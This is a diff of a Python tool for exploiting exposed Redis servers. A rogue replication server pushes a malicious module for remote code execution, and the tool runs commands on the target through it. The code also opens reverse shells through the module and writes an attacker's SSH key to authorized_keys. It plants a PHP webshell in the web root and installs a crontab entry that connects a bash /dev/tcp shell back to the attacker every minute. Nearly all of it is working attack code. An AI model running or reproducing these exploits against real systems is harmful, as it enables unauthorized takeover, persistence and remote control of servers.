@@ -91,49 +91,58 @@ BANNER = f"""
 
 # ─── RESP Protocol ──────────────────────────────────────────────────────────
 
-def encode_cmd(*args):
-    """Encode arguments into RESP array."""
-    buf = f"*{len(args)}\r\n".encode()
-    for a in args:
-        if isinstance(a, str):
-            a = a.encode()
-        buf += f"${len(a)}\r\n".encode() + a + b"\r\n"
-    return buf
+def encode_cmd_arr(arr):
+    """Encode a list of strings into RESP array format."""
+    cmd = ""
+    cmd += "*" + str(len(arr))
+    for arg in arr:
+        cmd += CLRF + "$" + str(len(arg))
+        cmd += CLRF + arg
+    cmd += CLRF
+    return cmd
 
 
-def recv_all(sock, timeout=3):
-    """Read all available data from socket with a HARD total deadline."""
-    deadline = time.time() + timeout
-    sock.settimeout(min(timeout, 2))  # short per-recv timeout
-    buf = b""
+def encode_cmd(raw_cmd):
+    """Encode a raw command string into RESP format."""
+    return encode_cmd_arr(raw_cmd.split(" "))
+
+
+CLRF = "\r\n"
+
+
+def din(sock, cnt=65535, timeout=5):
+    """Receive data — single recv, big buffer, done. (Ridter method)"""
+    sock.settimeout(timeout)
     try:
-        while time.time() < deadline:
-            remaining = deadline - time.time()
-            if remaining <= 0:
-                break
-            sock.settimeout(min(remaining, 2))
-            chunk = sock.recv(4096)
-            if not chunk:
-                break
-            buf += chunk
-            # Got data — check if it looks like a complete RESP response
-            # If we have a full response, don't wait for more
-            decoded = buf.decode(errors="replace")
-            if decoded.endswith("\r\n") and any(
-                decoded.startswith(p) for p in ("+", "-", ":", "$", "*")
-            ):
-                break
+        msg = sock.recv(cnt)
     except socket.timeout:
-        pass
+        return ""
     except OSError:
-        pass
-    return buf.decode(errors="replace")
+        return ""
+    if VERBOSE:
+        if len(msg) < 300:
+            dbg(f"← {msg}")
+        else:
+            dbg(f"← {msg[:80]}...{msg[-80:]}")
+    return msg.decode(errors="replace")
+
+
+def dout(sock, msg):
+    """Send data."""
+    if isinstance(msg, str):
+        msg = msg.encode()
+    sock.send(msg)
+
+
+def decode_shell_result(s):
+    """Extract command output from RESP bulk string response."""
+    return "\n".join(s.split("\r\n")[1:-1])
 
 
 # ─── Redis Connection ───────────────────────────────────────────────────────
 
 class Redis:
-    def __init__(self, host, port, password=None, timeout=8):
+    def __init__(self, host, port, password=None, timeout=5):
         self.host = host
         self.port = port
         self.password = password
@@ -150,36 +159,61 @@ class Redis:
             return False
         good(f"Connected to {self.host}:{self.port}")
 
+        # Auth check (Ridter method — test INFO first)
         if self.password:
-            r = self.cmd("AUTH", self.password)
+            r = self.do(f"AUTH {self.password}")
+            if "invalid password" in r.lower():
+                fail("Wrong password!")
+                return False
             if "OK" not in r:
                 fail(f"AUTH failed: {r.strip()}")
                 return False
             good("Authenticated")
+        else:
+            r = self.do("INFO")
+            if "NOAUTH" in r:
+                fail("Redis requires a password (use -a)")
+                return False
+
         return True
 
+    def send(self, msg):
+        dout(self.sock, msg)
+
+    def recv(self, cnt=65535):
+        return din(self.sock, cnt, self.timeout)
+
+    def do(self, raw_cmd):
+        """Send a raw command string and return response."""
+        self.send(encode_cmd(raw_cmd))
+        return self.recv()
+
     def cmd(self, *args):
-        """Send RESP command and return response."""
-        raw = encode_cmd(*args)
+        """Send a command as array and return response."""
+        raw = encode_cmd_arr(list(str(a) for a in args))
         dbg(f"→ {' '.join(str(a) for a in args)}")
         try:
-            self.sock.settimeout(self.timeout)
-            self.sock.sendall(raw)
-            # Use shorter timeout for recv — 3s is plenty for most commands
-            # Only MODULE LOAD and SLAVEOF might need longer
-            cmd_name = str(args[0]).upper() if args else ""
-            recv_timeout = self.timeout if cmd_name in ("MODULE", "SLAVEOF", "SAVE") else 3
-            resp = recv_all(self.sock, recv_timeout)
+            self.send(raw)
+            resp = self.recv()
         except (BrokenPipeError, ConnectionResetError, OSError) as e:
             fail(f"Connection lost: {e}")
             resp = f"-ERR connection lost: {e}"
         except Exception as e:
             resp = f"-ERR {e}"
-        dbg(f"← {resp[:120].strip()}")
         return resp
 
+    def shell_cmd(self, cmd):
+        """Execute OS command via system.exec module."""
+        self.send(encode_cmd_arr(['system.exec', cmd]))
+        buf = self.recv()
+        return buf
+
+    def reverse_shell(self, addr, port):
+        """Trigger system.rev module command."""
+        self.send(encode_cmd(f"system.rev {addr} {port}"))
+
     def config_get(self, key):
-        """Get a config value."""
+        """Get a Redis config value."""
         resp = self.cmd("CONFIG", "GET", key)
         lines = resp.strip().split("\r\n")
         for i in range(len(lines) - 1, -1, -1):
@@ -235,29 +269,40 @@ class RogueServer(threading.Thread):
         cli.settimeout(15)
         try:
             while True:
-                data = cli.recv(4096)
-                if not data:
+                data = din(cli, 1024, timeout=15)
+                if len(data) == 0:
                     break
-                decoded = data.decode(errors="replace")
-                dbg(f"Rogue RX: {decoded.strip()[:80]}")
-
-                if "PING" in decoded:
-                    cli.sendall(b"+PONG\r\n")
-                elif "REPLCONF" in decoded:
-                    cli.sendall(b"+OK\r\n")
-                elif "PSYNC" in decoded or "SYNC" in decoded:
-                    header = f"+FULLRESYNC {'Z' * 40} 1\r\n"
-                    header += f"${len(self.payload)}\r\n"
-                    cli.sendall(header.encode() + self.payload + b"\r\n")
-                    info(f"Payload delivered ({len(self.payload)} bytes)")
-                    self.delivered.set()
+                resp, phase = self.handle(data)
+                dout(cli, resp)
+                if phase == 4:
                     break
-                else:
-                    cli.sendall(b"+OK\r\n")
         except Exception as e:
             self.error = str(e)
         finally:
             cli.close()
+
+    def handle(self, data):
+        """Handle replication protocol — matches Ridter's pattern."""
+        resp = ""
+        phase = 0
+        if data.find("PING") > -1:
+            resp = "+PONG" + CLRF
+            phase = 1
+        elif data.find("REPLCONF") > -1:
+            resp = "+OK" + CLRF
+            phase = 2
+        elif data.find("AUTH") > -1:
+            resp = "+OK" + CLRF
+            phase = 3
+        elif data.find("PSYNC") > -1 or data.find("SYNC") > -1:
+            resp = "+FULLRESYNC " + "Z" * 40 + " 0" + CLRF
+            resp += "$" + str(len(self.payload)) + CLRF
+            resp = resp.encode()
+            resp += self.payload + CLRF.encode()
+            phase = 4
+            info(f"Payload delivered ({len(self.payload)} bytes)")
+            self.delivered.set()
+        return resp, phase
 
 
 # ─── Core Exploit ────────────────────────────────────────────────────────────
@@ -267,7 +312,7 @@ def recon(r):
     print()
     info(f"{C.BOLD}═══ Recon ═══{C.RST}")
 
-    resp = r.cmd("INFO", "server")
+    resp = r.do("INFO server")
     for line in resp.split("\r\n"):
         if line.startswith("redis_version:"):
             info(f"Version:    {C.CYN}{line.split(':',1)[1]}{C.RST}")
@@ -281,13 +326,13 @@ def recon(r):
     info(f"dir:        {r.config_get('dir')}")
     info(f"dbfilename: {r.config_get('dbfilename')}")
 
-    resp = r.cmd("INFO", "replication")
+    resp = r.do("INFO replication")
     for line in resp.split("\r\n"):
         if line.startswith("role:"):
             info(f"Role:       {line.split(':',1)[1]}")
 
     # Test MODULE
-    resp = r.cmd("MODULE", "LIST")
+    resp = r.do("MODULE LIST")
     if "unknown command" in resp.lower():
         warn("MODULE command unavailable")
     else:
@@ -297,11 +342,41 @@ def recon(r):
 
 
 def exploit_module_load(r, args, payload_data):
-    """Full SLAVEOF → PSYNC → MODULE LOAD chain."""
+    """Full SLAVEOF → PSYNC → MODULE LOAD chain.
+    Tries multiple writable directories if the default dir fails."""
 
     orig_dir = r.config_get("dir")
     orig_dbfile = r.config_get("dbfilename")
     module_file = args.module_name
+
+    # Directories to try writing the module to — ordered by likelihood
+    write_dirs = ["/tmp", "/var/tmp", "/dev/shm", "/var/lib/redis", "/opt"]
+    # If orig_dir looks writable (not / or empty), try it first
+    if orig_dir and orig_dir != "/":
+        write_dirs.insert(0, orig_dir)
+
+    # Find a writable dir by trying CONFIG SET dir
+    write_dir = None
+    for d in write_dirs:
+        r.do(f"CONFIG SET dir {d}")
+        check = r.config_get("dir")
+        if d in check:
+            write_dir = d
+            info(f"Writable dir found: {C.CYN}{d}{C.RST}")
+            break
+        dbg(f"Can't write to {d}")
+
+    if not write_dir:
+        fail("No writable directory found for module delivery")
+        warn("Try uploading module.so manually (FTP, SCP, web upload)")
+        warn("Then: redis-cli -h TARGET MODULE LOAD /path/to/module.so")
+        # Restore
+        r.do(f"CONFIG SET dir {orig_dir}")
+        r.do(f"CONFIG SET dbfilename {orig_dbfile}")
+        return False
+
+    # Set dbfilename to our module name
+    r.do(f"CONFIG SET dbfilename {module_file}")
 
     # Start rogue server
     rogue = RogueServer("0.0.0.0", args.lport, payload_data)
@@ -309,18 +384,20 @@ def exploit_module_load(r, args, payload_data):
     rogue.ready.wait(5)
     if rogue.error:
         fail(f"Rogue server: {rogue.error}")
+        r.do(f"CONFIG SET dir {orig_dir}")
+        r.do(f"CONFIG SET dbfilename {orig_dbfile}")
         return False
 
     info(f"Rogue server on port {args.lport}")
 
     # Set up replication
     info("Setting up replication...")
-    resp = r.cmd("SLAVEOF", args.lhost, str(args.lport))
+    resp = r.do(f"SLAVEOF {args.lhost} {args.lport}")
     if "OK" not in resp:
         fail(f"SLAVEOF failed: {resp.strip()}")
+        r.do(f"CONFIG SET dir {orig_dir}")
+        r.do(f"CONFIG SET dbfilename {orig_dbfile}")
         return False
-
-    r.cmd("CONFIG", "SET", "dbfilename", module_file)
 
     # Wait for payload delivery
     info("Waiting for sync...")
@@ -332,26 +409,35 @@ def exploit_module_load(r, args, payload_data):
     time.sleep(1)
 
     # Stop replication
-    r.cmd("SLAVEOF", "NO", "ONE")
+    r.do("SLAVEOF NO ONE")
     time.sleep(0.5)
 
-    # Load module
-    module_path = f"{orig_dir}/{module_file}"
+    # Load module from the writable dir
+    module_path = f"{write_dir}/{module_file}"
     info(f"Loading module: {module_path}")
-    resp = r.cmd("MODULE", "LOAD", module_path)
+    resp = r.do(f"MODULE LOAD {module_path}")
 
     if "OK" not in resp:
         if "already" in resp.lower():
             warn("Module already loaded")
         else:
-            fail(f"MODULE LOAD failed: {resp.strip()}")
+            # Show the ACTUAL error
+            err_msg = resp.strip()
+            # Extract just the error text from RESP
+            for line in err_msg.split("\r\n"):
+                if line.startswith("-"):
+                    err_msg = line[1:].strip()
+                    break
+            fail(f"MODULE LOAD failed: {err_msg}")
+            warn(f"Check if file exists: redis-cli -h {args.target} CONFIG SET dir {write_dir}")
             cleanup(r, orig_dir, orig_dbfile)
             return False
 
     good(f"{C.BOLD}RCE achieved!{C.RST}")
 
-    # Restore dbfilename
-    r.cmd("CONFIG", "SET", "dbfilename", orig_dbfile)
+    # Restore config
+    r.do(f"CONFIG SET dir {orig_dir}")
+    r.do(f"CONFIG SET dbfilename {orig_dbfile}")
     return True
 
 
@@ -359,13 +445,13 @@ def cleanup(r, orig_dir=None, orig_dbfile=None, module_path=None, unload=False):
     """Restore Redis state."""
     info("Cleaning up...")
     try:
-        r.cmd("SLAVEOF", "NO", "ONE")
+        r.do("SLAVEOF NO ONE")
         if orig_dbfile:
-            r.cmd("CONFIG", "SET", "dbfilename", orig_dbfile)
+            r.do(f"CONFIG SET dbfilename {orig_dbfile}")
         if unload:
             if module_path:
-                r.cmd("system.exec", f"rm -f {module_path}")
-            r.cmd("MODULE", "UNLOAD", "system")
+                r.shell_cmd(f"rm -f {module_path}")
+            r.do("MODULE UNLOAD system")
             good("Module unloaded")
     except:
         pass
@@ -375,20 +461,11 @@ def cleanup(r, orig_dir=None, orig_dbfile=None, module_path=None, unload=False):
 
 def exec_cmd(r, cmd):
     """Run a command via system.exec, return output."""
-    resp = r.cmd("system.exec", cmd)
-    lines = resp.strip().split("\r\n")
-    out = []
-    i = 0
-    while i < len(lines):
-        if lines[i].startswith("$"):
-            if i + 1 < len(lines):
-                out.append(lines[i + 1])
-                i += 2
-                continue
-        elif not lines[i].startswith(("*", "+", "-", ":")):
-            out.append(lines[i])
-        i += 1
-    return "\n".join(out)
+    resp = r.shell_cmd(cmd)
+    if 'unknown command' in resp:
+        fail(f"Module not loaded: {resp.strip()}")
+        return None
+    return decode_shell_result(resp)
 
 
 def do_exec(r, cmd):
@@ -445,14 +522,14 @@ def do_revshell(r, args):
 
     if payload_name == "module":
         info(f"Sending system.rev → {args.lhost}:{args.lport_rev}")
-        r.cmd("system.rev", args.lhost, str(args.lport_rev))
+        r.reverse_shell(args.lhost, args.lport_rev)
     else:
         shell_cmd = payloads.get(payload_name)
         if not shell_cmd:
             fail(f"Unknown payload: {payload_name}")
             return
         info(f"Sending {payload_name} reverse shell")
-        r.cmd("system.exec", shell_cmd)
+        r.shell_cmd(shell_cmd)
 
     good("Reverse shell sent!")
 
@@ -533,18 +610,19 @@ def write_ssh_key(r, args):
         info(f"Trying: {ssh_dir}")
 
         # Create .ssh directory via a trick — write a dummy file to force dir creation
-        r.cmd("CONFIG", "SET", "dir", ssh_dir)
+        r.do(f"CONFIG SET dir {ssh_dir}")
         check = r.config_get("dir")
         if ssh_dir not in check:
             dbg(f"Can't set dir to {ssh_dir}")
             continue
 
-        r.cmd("CONFIG", "SET", "dbfilename", "authorized_keys")
+        r.do("CONFIG SET dbfilename authorized_keys")
 
         # Pad the key with newlines so Redis RDB headers don't corrupt it
         padded_key = f"\n\n{pubkey}\n\n"
-        r.cmd("SET", "husky_key", padded_key)
-        r.cmd("SAVE")
+        r.send(encode_cmd_arr(["SET", "husky_key", padded_key]))
+        r.recv()
+        r.do("SAVE")
 
         good(f"SSH key written to {ssh_dir}/authorized_keys")
 
@@ -559,14 +637,14 @@ def write_ssh_key(r, args):
         good(f"Connect: {C.CYN}ssh -i {key_path.replace('.pub', '')} {user}@{args.target}{C.RST}")
 
         # Restore
-        r.cmd("CONFIG", "SET", "dir", orig_dir)
-        r.cmd("CONFIG", "SET", "dbfilename", orig_dbfile)
-        r.cmd("DEL", "husky_key")
+        r.do(f"CONFIG SET dir {orig_dir}")
+        r.do(f"CONFIG SET dbfilename {orig_dbfile}")
+        r.do("DEL husky_key")
         return True
 
     fail("Could not write SSH key to any directory")
-    r.cmd("CONFIG", "SET", "dir", orig_dir)
-    r.cmd("CONFIG", "SET", "dbfilename", orig_dbfile)
+    r.do(f"CONFIG SET dir {orig_dir}")
+    r.do(f"CONFIG SET dbfilename {orig_dbfile}")
     return False
 
 
@@ -579,16 +657,17 @@ def write_webshell(r, args):
     orig_dir = r.config_get("dir")
     orig_dbfile = r.config_get("dbfilename")
 
-    r.cmd("CONFIG", "SET", "dir", web_root)
-    r.cmd("CONFIG", "SET", "dbfilename", "husky.php")
-    r.cmd("SET", "husky_shell", '<?php system($_GET["cmd"]." 2>&1"); ?>')
-    r.cmd("SAVE")
+    r.do(f"CONFIG SET dir {web_root}")
+    r.do("CONFIG SET dbfilename husky.php")
+    r.send(encode_cmd_arr(['SET', 'husky_shell', '<?php system($_GET["cmd"]." 2>&1"); ?>']))
+    r.recv()
+    r.do("SAVE")
 
     good(f"Webshell: {C.CYN}http://{args.target}/{'' if web_root.endswith('/') else '/'}husky.php?cmd=id{C.RST}")
 
-    r.cmd("CONFIG", "SET", "dir", orig_dir)
-    r.cmd("CONFIG", "SET", "dbfilename", orig_dbfile)
-    r.cmd("DEL", "husky_shell")
+    r.do(f"CONFIG SET dir {orig_dir}")
+    r.do(f"CONFIG SET dbfilename {orig_dbfile}")
+    r.do("DEL husky_shell")
     return True
 
 
@@ -608,26 +687,27 @@ def write_crontab(r, args):
     cron_payload = f"\n\n* * * * * bash -c 'bash -i >& /dev/tcp/{args.lhost}/{args.lport_rev} 0>&1'\n\n"
 
     for cron_dir in cron_dirs:
-        r.cmd("CONFIG", "SET", "dir", cron_dir)
+        r.do(f"CONFIG SET dir {cron_dir}")
         check = r.config_get("dir")
         if cron_dir not in check:
             continue
 
-        r.cmd("CONFIG", "SET", "dbfilename", "root")
-        r.cmd("SET", "husky_cron", cron_payload)
-        r.cmd("SAVE")
+        r.do("CONFIG SET dbfilename root")
+        r.send(encode_cmd_arr(["SET", "husky_cron", cron_payload]))
+        r.recv()
+        r.do("SAVE")
 
         good(f"Cron written to {cron_dir}/root")
         good(f"Shell will call back to {args.lhost}:{args.lport_rev} every minute")
 
-        r.cmd("CONFIG", "SET", "dir", orig_dir)
-        r.cmd("CONFIG", "SET", "dbfilename", orig_dbfile)
-        r.cmd("DEL", "husky_cron")
+        r.do(f"CONFIG SET dir {orig_dir}")
+        r.do(f"CONFIG SET dbfilename {orig_dbfile}")
+        r.do("DEL husky_cron")
         return True
 
     fail("Could not write to any cron directory")
-    r.cmd("CONFIG", "SET", "dir", orig_dir)
-    r.cmd("CONFIG", "SET", "dbfilename", orig_dbfile)
+    r.do(f"CONFIG SET dir {orig_dir}")
+    r.do(f"CONFIG SET dbfilename {orig_dbfile}")
     return False
 
 
